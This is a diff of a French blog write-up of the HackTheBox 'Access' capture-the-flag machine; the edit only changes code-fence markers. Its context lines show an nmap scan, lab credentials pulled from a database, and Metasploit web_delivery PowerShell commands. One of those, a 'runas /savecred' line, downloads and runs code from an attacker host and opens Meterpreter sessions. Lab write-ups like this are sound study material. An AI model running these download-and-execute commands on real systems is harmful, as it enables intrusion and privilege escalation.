@@ -9,7 +9,7 @@ tags: [CTF,HackTheBox]
 
 Alors le CTF s'appelle *Access*. Aurons nous droit à de l'injection SQL ? Suspense :p  
 
-```plain
+```
 Nmap scan report for 10.10.10.98
 Host is up (0.042s latency).
 
@@ -58,7 +58,7 @@ Pas vraiment l'envie ni le courage de trouver un MS Access ou de convertir le MD
 
 Il permet de naviguer dans les différentes tables de la base, de télécharger une version XLS ou des fichier CSV. J'ai vite trouvé mon bonheur dans l'une des tables :  
 
-```plain
+```
 id,username,password,Status,last_login,RoleID,Remark
 25,"admin","admin",1,"08/23/18 21:11:47",26,
 27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
@@ -76,7 +76,7 @@ Processing Folder "Deleted Items"
 
 Dans la corbeille on trouve ce courrier intéressant :  
 
-```plain
+```
 From "john@megacorp.com" Fri Aug 24 01:44:07 2018
 Status: RO
 From: john@megacorp.com <john@megacorp.com>
@@ -165,7 +165,7 @@ DIDN'T READ LOL
 
 On arrive donc sur ce système avec les utilisateurs et les infos suivantes :  
 
-```plain
+```
 User accounts for \\ACCESS
 
 -------------------------------------------------------------------------------
@@ -190,7 +190,7 @@ This program is blocked by group policy. For more information, contact your syst
 
 C'est une restriction en mousse (tm) très vite bypassée via PowerShell en utilisant le module *web\_delivery* de *Metasploit* (ce module génère une ligne de commande utilisant au choix Powershell, Python, PHP, etc qui va télécharger et exécuter du code) :  
 
-```plain
+```
 msf exploit(multi/script/web_delivery) > show options
 
 Module options (exploit/multi/script/web_delivery):
@@ -234,7 +234,7 @@ powershell.exe -nop -w hidden -c $R=new-object net.webclient;$R.proxy=[Net.WebRe
 
 On enchaîne alors sur le module *local\_exploit\_suggester* pour chercher une faille d'escalade de privilèges :  
 
-```plain
+```
 msf exploit(multi/script/web_delivery) > use post/multi/recon/local_exploit_suggester
 msf post(multi/recon/local_exploit_suggester) > set session 1
 session => 1
@@ -296,7 +296,7 @@ C:\Users\Public\Desktop>dir
 
 Un strings retourne le résultat suivant :  
 
-```plain
+```
 /C:\
 Windows
 System32
@@ -333,7 +333,7 @@ On peut réutiliser le module *web\_delivery* :
 runas /user:administrator /savecred "cmd.exe /C powershell -nop -exec bypass -c IEX (New-Object net.webclient).downloadString('http://10.10.14.177:8080/imyRs8I0j3wnU')"
 ```
 
-```plain
+```
 [*] 10.10.10.98      web_delivery - Delivering Payload
 [*] Sending stage (206407 bytes) to 10.10.10.98
 [*] Meterpreter session 3 opened (10.10.14.177:4444 -> 10.10.10.98:49161) at 2018-10-12 10:31:32 +0200
@@ -426,7 +426,7 @@ PowerShell Parse-LnkFile is good for you
 
 C'est mon premier script PowerShell, tout commentaire est le bienvenue :  
 
-```plain
+```
 function Parse-LnkFile{
 <#
     .SYNOPSIS
